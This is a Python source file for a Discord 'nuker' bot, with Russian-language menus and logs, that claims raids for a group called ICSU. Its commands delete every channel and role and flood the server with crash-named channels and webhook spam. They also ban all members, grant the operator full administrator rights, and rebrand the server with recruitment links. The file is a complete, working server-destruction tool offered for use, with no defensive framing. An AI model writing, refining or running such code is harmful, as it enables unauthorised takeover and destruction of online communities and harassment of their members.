import os
import asyncio
import aiofile
import discord
import colorama
import datetime
from discord import Permissions
from aiofile import async_open
from colorama import Fore, init
from discord.ext.commands import Bot

init()

intents = discord.Intents.all()
bot = Bot(command_prefix="!", intents=intents)
bot.remove_command("help")
bot.activity = discord.Activity(type=discord.ActivityType.watching, name="https://discord.gg/jPzvYYjRSd")

CRASH_CHANNEL_NAME = "☠-crashed-by-icsu-{}"
CRASH_SERVER_NAME = ">>CRSHHD BY ICSU>>"
CRASH_DESCRIPTION = (
    "Сервер захвачен группировкой СЕООИ, переходите на наш сервер >>> https://discord.gg/jPzvYYjRSd"
)

pfp = open('icon.png', 'rb')

def draw_menu():
    print(Fore.MAGENTA + r'''
 ███▄    █  █    ██  ██ ▄█▀▓█████  ▄▄▄▄    ▒█████  ▄▄▄█████▓ ▄▄▄▄    █    ██  ██▓ ██▓    ▓█████▄ ▓█████  ██▀███
██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒▓█████▄  ██  ▓██▒▓██▒▓██▒    ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░▒██▒ ▄██▓██  ▒██░▒██▒▒██░    ░██   █▌▒███   ▓██ ░▄█ ▒
▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██░█▀  ▒██   ██░░ ▓██▓ ░ ▒██░█▀  ▓▓█  ░██░░██░▒██░    ░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄
▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ ░▓█  ▀█▓▒▒█████▓ ░██░░██████▒░▒████▓ ░▒████▒░██▓ ▒██▒
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   ░▒▓███▀▒░▒▓▒ ▒ ▒ ░▓  ░ ▒░▓  ░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░     ░    ▒░▒   ░ ░░▒░ ░ ░  ▒ ░░ ░ ▒  ░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░    ░    ░ ░ ░ ░ ▒    ░       ░    ░  ░░░ ░ ░  ▒ ░  ░ ░    ░ ░  ░    ░     ░░   ░
    ░    ░     ░  ░      ░  ░ ░          ░ ░            ░         ░      ░      ░  ░   ░       ░  ░   ░
    ░                         ░                       ░
!nuke - крашит сервер              !admin - выдача прав администратора
!spam - спам во всех каналах       !allban - банит всех пользователей
    ''', Fore.RESET)
    
    
def log(operators, message):

    match operators:
        case '+':
            color = Fore.GREEN
        case '~':
            color = Fore.YELLOW
        case '-':
            color = Fore.RED

    output = f"[{operators}] {Fore.RESET + message}"
    print(color+output)

def load_tokens():
    if not os.path.exists("token.txt"):
        print("Файл token.txt не найден.")
        return []
    with open("token.txt", "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]


def select_token(tokens):
    print("Выберите токен:")
    for idx, token in enumerate(tokens):
        print(f"[{idx + 1}] {token[:25]}...")
    try:
        choice = int(
            input("\nВведите номер токена для запуска:").strip()
        )
        os.system("cls")
        draw_menu()
        return tokens[choice - 1]
    except:
        print("Неверный ввод.")
        return None


@bot.event
async def on_ready():
    log('+', f"Бот включен как {bot.user}")


@bot.command()
async def allban(ctx):
    await ctx.message.delete()
    log('~', "Выполняется бан участников...")

    async for member in ctx.guild.members:
        try:
            await member.ban(reason="CRSHHD BY ICSU")
            log('+', f"Забанен: {member}")
        except:
            log('-', f"Не удалось забанить: {member}")

async def spm_hook(webhook):
    raid_txt = ""
    async with async_open("text.txt","r", encoding="utf-8") as f:
        raid_txt = await f.read()
    for i in range(30):
        try:
            await webhook.send(raid_txt)
        except (discord.Forbidden, discord.NotFound):
            return
        except:
            pass
    log('+', f"Спам завершен в {webhook.channel}")

async def create_hook(ctx):
    for chan in ctx.guild.text_channels:
        webhook = await chan.create_webhook(
            name='ICSU',
            avatar = pfp.read()
        )

        asyncio.gather(spm_hook(webhook))

@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    log('~', "Спам выполняется...")
    asyncio.gather(create_hook(ctx))


async def wipe_channels(guild, create_one=False):
    for channel in guild.channels:
        try:
            await channel.delete()
        except (discord.Forbidden, discord.NotFound):
            return
        except:
            pass


async def create_crash_channels(guild):
    channels = []
    for i in range(15):
        try:
            ch = await guild.create_text_channel(CRASH_CHANNEL_NAME.format(i))
            channels.append(ch)
        except (discord.Forbidden, discord.NotFound):
            return
        except:
            continue
    return channels


async def delete_roles(guild):
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except (discord.Forbidden, discord.NotFound):
                return
            except:
                continue


async def create_roles(guild):
    for _ in range(10):
        try:
            await guild.create_role(name="CRSHHD BY ICSU", permissions=Permissions.none())
        except (discord.Forbidden, discord.NotFound):
            return
        except:
            continue


@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    log('~', "Выполняется краш сервера...")

    await guild.edit(
        name=CRASH_SERVER_NAME, 
        description=CRASH_DESCRIPTION,
        icon = pfp.read()
    )
    
    start_time = discord.utils.utcnow() + datetime.timedelta(minutes=1)
    end_time = start_time + datetime.timedelta(days=365)

    try:
        event = await guild.create_scheduled_event(
            name="ICSU links",
            description="Discord: https://discord.gg/Cju3qReNWy\nYouTube: https://www.youtube.com/@icsunew\nGitHub: https://github.com/sourcenoob",
            start_time=start_time,
            end_time=end_time,
            entity_type=discord.EntityType.external,
            location="https://discord.gg/Cju3qReNWy",
            privacy_level=discord.PrivacyLevel.guild_only,
        )
    except discord.Forbidden:
        log('-', "У бота нет прав на создание событий.")
    except Exception as e:
        log('-', f"Ошибка при создании события: {e}")

    asyncio.gather(
        wipe_channels(guild),
        create_crash_channels(guild),
        delete_roles(guild),
        create_roles(guild)
        )

@bot.event
async def on_guild_channel_create(channel):
    if channel.name.startswith("☠-crashed-by-icsu-"):
        webhook = await channel.create_webhook(name="ICSU", avatar=await channel.guild.icon.read())
        asyncio.gather(spm_hook(webhook))

@bot.command()
async def admin(ctx):
    await ctx.message.delete()
    log('~', "Выполняется создание роли...")

    guild = ctx.guild
    role_name = "ICSU ADMIN"
    role = discord.utils.get(guild.roles, name=role_name)

    if not role:
        role = await guild.create_role(
            name=role_name, permissions=Permissions.all()
        )

    await ctx.author.add_roles(role)
    log('+', f"Выдана роль {role_name} пользователю {ctx.author}")



if __name__ == "__main__":
    tokens = load_tokens()
    if not tokens:
        exit("Нет токенов")
    token = select_token(tokens)
    bot.run(token, log_handler=None)
